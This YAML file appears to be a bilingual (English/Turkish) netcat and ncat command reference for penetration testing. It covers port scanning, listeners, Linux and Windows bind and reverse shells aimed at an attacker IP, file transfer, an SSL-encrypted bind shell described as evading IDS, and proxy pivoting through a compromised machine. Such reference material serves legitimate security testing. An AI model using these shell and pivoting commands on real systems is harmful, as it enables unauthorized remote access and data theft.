tool: netcat
tags: [network, security, pentest, shell, transfer, enumeration, scanning]

actions:
  # === BASIC CONNECTIVITY AND SCANNING ===
  - title:
      en: nc - port scanning
      tr: nc - port taraması
    desc:
      en: |
        Performs a basic TCP port scan on a specific target. The -z flag ensures
        that nc does not send any data once the connection is established, making
        it ideal for scanning. The -v flag provides verbose output to indicate
        whether a port is open or closed.
      tr: |
        Belirli bir hedefte temel bir TCP port taraması gerçekleştirir. -z bayrağı
        bağlantı kurulduktan sonra nc'nin veri göndermemesini sağlar ve bunu tarama
        için ideal kılar. -v bayrağı bir portun açık mı kapalı mı olduğunu göstermek
        için ayrıntılı çıktı sağlar.
    command: "nc -zv {{target}} {{port_range|1-1000}}"

  - title:
      en: nc - banner grabbing
      tr: nc - banner yakalama
    desc:
      en: |
        Connects to a specific port to retrieve the service banner. This is a 
        fundamental step in reconnaissance to identify the software and version 
        running on a port. Simply connecting and pressing 'Enter' often triggers
         the service to reveal its identification string.
      tr: |
        Hizmet banner'ını almak için belirli bir porta bağlanır. Bu,
        bir portta çalışan yazılım ve sürümü belirlemek için keşifte temel bir
        adımdır. Yalnızca bağlanıp 'Enter'a basmak genellikle hizmetin kendini
        tanıtan dizesini açığa çıkarmasını tetikler.
    command: "nc -v {{target}} {{port}}"

  # === LISTENER SETUP ===
  - title:
      en: nc - basic tcp listener
      tr: nc - temel tcp dinleyicisi
    desc:
      en: |
        Sets up a TCP listener on the specified local port. This is frequently used
        to receive incoming data or to catch a reverse shell during an exploit. 
        The -l flag tells nc to listen, while -p specifies the port and -v enables
        verbose logging for incoming connections.
      tr: |
        Belirtilen yerel portta bir TCP dinleyicisi kurar. Bu, gelen veriyi almak
        veya bir sömürü sırasında ters kabuk yakalamak için sık kullanılır.
        -l bayrağı nc'ye dinlemesini söylerken -p portu belirtir ve -v gelen
        bağlantılar için ayrıntılı günlük kaydını etkinleştirir.
    command: "nc -nlvp {{lport|4444}}"

  # === BIND SHELLS ===
  - title:
      en: nc - bind shell linux
      tr: nc - bind kabuk linux
    desc:
      en: |
        Binds a bash shell to a local port on a Linux system. When a remote user
        connects to this port, they are immediately granted access to the bash
        environment. This is highly insecure and should only be used in 
        controlled environments as it lacks any form of authentication.
      tr: |
        Bir Linux sisteminde yerel bir porta bash kabuğu bağlar. Uzak bir kullanıcı
        bu porta bağlandığında anında bash ortamına erişim kazanır. Bu son derece
        güvensizdir ve hiçbir kimlik doğrulaması içermediğinden yalnızca denetimli
        ortamlarda kullanılmalıdır.
    command: "nc -nlvp {{lport|4444}} -e /bin/bash"

  - title:
      en: nc - bind shell windows
      tr: nc - bind kabuk windows
    desc:
      en: |
        Binds the Windows command prompt (cmd.exe) to a local port. This allows
        anyone who connects to that port to execute commands on the host machine.
        Ensure the local firewall is configured to allow traffic on the chosen 
        port for this to work successfully.
      tr: |
        Windows komut istemini (cmd.exe) yerel bir porta bağlar. Bu, o porta
        bağlanan herkesin makinede komut çalıştırmasına olanak tanır. Bunun
        başarıyla çalışması için yerel güvenlik duvarının seçilen porttaki trafiğe
        izin verecek şekilde yapılandırıldığından emin olun.
    command: "nc -nlvp {{lport|4444}} -e cmd.exe"

  # === REVERSE SHELLS ===
  - title:
      en: nc - reverse shell linux
      tr: nc - ters kabuk linux
    desc:
      en: |
        Initiates a reverse shell from a Linux target back to an attacker's listener.
        This technique is used to bypass restrictive inbound firewall rules by 
        initiating an outbound connection. The attacker must have a listener
        running (e.g., nc -lvp) on the specified IP and port before executing this.
      tr: |
        Bir Linux hedeften saldırganın dinleyicisine geri bir ters kabuk başlatır.
        Bu teknik, giden bir bağlantı başlatarak kısıtlayıcı gelen güvenlik duvarı
        kurallarını aşmak için kullanılır. Saldırganın bunu çalıştırmadan önce
        belirtilen IP ve portta çalışan bir dinleyicisi olmalıdır (ör. nc -lvp).
    command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e /bin/bash"

  - title:
      en: nc - reverse shell windows
      tr: nc - ters kabuk windows
    desc:
      en: |
        Connects back to an attacker's machine and provides a Windows cmd.exe shell.
        It is a common method for maintaining access after a successful exploit on
        a Windows system. Note that modern antivirus or EDR solutions may detect
        and block this behavior.
      tr: |
        Saldırganın makinesine geri bağlanır ve bir Windows cmd.exe kabuğu sağlar.
        Bir Windows sisteminde başarılı sömürü sonrası erişimi sürdürmek için yaygın
        bir yöntemdir. Modern antivirüs veya EDR çözümlerinin bu davranışı tespit
        edip engelleyebileceğini unutmayın.
    command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e cmd.exe"

  # === FILE TRANSFER ===
  - title:
      en: nc - receive file
      tr: nc - dosya alma
    desc:
      en: |
        Sets up a listener to receive a file and save it to the local disk.
        The output redirection operator (>) is used to capture the incoming 
        stream and write it to the specified file name. Start this listener 
        before the sender starts their connection.
      tr: |
        Bir dosyayı alıp yerel diske kaydetmek için bir dinleyici kurar.
        Çıktı yönlendirme işleci (>) gelen akışı yakalayıp belirtilen dosya adına
        yazmak için kullanılır. Gönderici bağlantısını başlatmadan önce bu dinleyiciyi
        başlatın.
    command: "nc -nlvp {{lport|4445}} > {{incoming_file}}"

  - title:
      en: nc - send file
      tr: nc - dosya gönderme
    desc:
      en: |
        Sends a local file to a remote listener by redirecting the file content 
        into the nc connection. This is a quick way to transfer scripts, binaries,
        or data between machines without needing SSH or FTP. The receiver must 
        be listening for the connection to be successful.
      tr: |
        Dosya içeriğini nc bağlantısına yönlendirerek yerel bir dosyayı uzak bir
        dinleyiciye gönderir. SSH veya FTP gerektirmeden makineler arası betik,
        ikili dosya veya veri aktarmanın hızlı bir yoludur. Bağlantının başarılı
        olması için alıcının dinliyor olması gerekir.
    command: "nc -nv {{target_ip}} {{port|4445}} < {{file_to_send}}"

  # === NCAT ADVANCED FEATURES ===
  - title:
      en: ncat - bind shell with ssl and access control
      tr: ncat - ssl ve erişim denetimli bind kabuk
    desc:
      en: |
        Creates an encrypted bind shell that only allows a specific source IP to
        connect. Using the --ssl flag encrypts the traffic, making it harder for 
        IDS systems to detect the shell commands. The --allow flag provides a 
        basic layer of security by filtering who can connect.
      tr: |
        Yalnızca belirli bir kaynak IP'nin bağlanmasına izin veren şifreli bir bind
        kabuğu oluşturur. --ssl bayrağını kullanmak trafiği şifreler ve IDS
        sistemlerinin kabuk komutlarını tespit etmesini zorlaştırır. --allow bayrağı
        kimlerin bağlanabileceğini filtreleyerek temel bir güvenlik katmanı sağlar.
    command: "ncat --exec {{shell_path|/bin/bash}} --allow {{allowed_ip}} -vnl {{port|4444}} --ssl"

  - title:
      en: ncat - secure connection with ssl
      tr: ncat - ssl ile güvenli bağlantı
    desc:
      en: |
        Connects to a remote listener using SSL/TLS encryption. This is used to
        interact with ncat listeners that have SSL enabled, ensuring the 
        entire communication remains private. This can also be used to test
        SSL-wrapped services like HTTPS or SMTPS.
      tr: |
        SSL/TLS şifrelemesi kullanarak uzak bir dinleyiciye bağlanır. Bu, SSL
        etkin ncat dinleyicileriyle etkileşim için kullanılır ve tüm iletişimin
        gizli kalmasını sağlar. HTTPS veya SMTPS gibi SSL sarmalı hizmetleri test
        etmek için de kullanılabilir.
    command: "ncat -v {{target_ip}} {{port|4444}} --ssl"

  - title:
      en: ncat - http proxy mode
      tr: ncat - http proxy modu
    desc:
      en: |
        Turns ncat into a simple HTTP proxy server. This can be used for pivoting
        traffic through a compromised machine or to route web traffic through
        a specific network interface. This proxy does not support authentication 
        in its simplest form.
      tr: |
        Ncat'i basit bir HTTP proxy sunucusuna dönüştürür. Bu, trafiği ele
        geçirilmiş bir makine üzerinden yönlendirmek (pivoting) veya web trafiğini
        belirli bir ağ arayüzünden geçirmek için kullanılabilir. Bu proxy en basit
        biçiminde kimlik doğrulamayı desteklemez.
    command: "ncat --listen --proxy-type http {{lport|8080}}"
